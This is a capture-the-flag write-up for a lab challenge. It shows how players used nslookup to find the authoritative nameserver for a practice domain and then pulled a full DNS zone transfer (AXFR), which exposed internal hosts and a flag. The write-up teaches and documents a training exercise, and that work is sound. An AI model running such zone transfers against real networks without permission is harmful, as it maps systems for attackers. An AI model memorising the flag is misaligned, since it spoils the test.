Danger Zone Writeup
===================
## Category
Corporate Penetration Testing

## Question
Recover the list of external systems on the ECWI corporate network. The initiative's dns domain is ecwi.cysca.

## Designed Solution
Players use dig or nslookup to get the authority record for ecwi.cysca from the external DNS server 192.168.5.53.
They request a domain transfer from ns.ecwi.cysa (172.16.5.53).

## Hints Given
  * If you want the flag maybe you should just AXFR it!

## Player Solution Comments
Players solved this challenge in much the same way. Some used tools such as `dnsrecon`, `fierce` or `dnsenum` instead of dig.

## Writeup
We read the question and it states that we should get a list of external systems on the ECWI corporate network. Considering our only access or information at this point is what we can glean from the external DNS server (and from reading last years writeups) we can surmise that there may be a configuration issue in the internal DNS server.

We first need to determine the authoritative server for the ecwi.cysca domain. We do this by asking the external DNS server for the SOA record for ecwi.cysca.

```bash
root@kali:~# nslookup -type=soa ecwi.cysca 192.168.5.53
Server:		192.168.5.53
Address:	192.168.5.53#53

Non-authoritative answer:
ecwi.cysca
	origin = ns.ecwi.cysca
	mail addr = admin.ecwi.cysca
	serial = 2015070401
	refresh = 28800
	retry = 7200
	expire = 864000
	minimum = 86400

Authoritative answers can be found from:
ecwi.cysca	nameserver = ns.ecwi.cysca.
ns.ecwi.cysca	internet address = 172.16.5.53
```

Now with the IP address for the authoritative DNS server for the ecwi.cysca domain, we try requesting a domain transfer which is successful and we  get our first Corporate Penetration Testing flag.
```bash
root@kali:~# nslookup -type=axfr ecwi.cysca 172.16.5.53
Server:		172.16.5.53
Address:	172.16.5.53#53

ecwi.cysca
	origin = ns.ecwi.cysca
	mail addr = admin.ecwi.cysca
	serial = 2015070401
	refresh = 28800
	retry = 7200
	expire = 864000
	minimum = 86400
ecwi.cysca	nameserver = ns.ecwi.cysca.
Name:	ecwi.cysca
Address: 172.16.5.80
Name:	ns.ecwi.cysca
Address: 172.16.5.53
Name:	proxy.ecwi.cysca
Address: 172.16.5.30
Name:	support.ecwi.cysca
Address: 172.16.5.85
Name:	www.ecwi.cysca
Address: 172.16.5.80
zonetransferflag.ecwi.cysca	text = "FLAG{749929CE145DD73A8D1530E2170B1587}"
ecwi.cysca
	origin = ns.ecwi.cysca
	mail addr = admin.ecwi.cysca
	serial = 2015070401
	refresh = 28800
	retry = 7200
	expire = 864000
	minimum = 86400
```
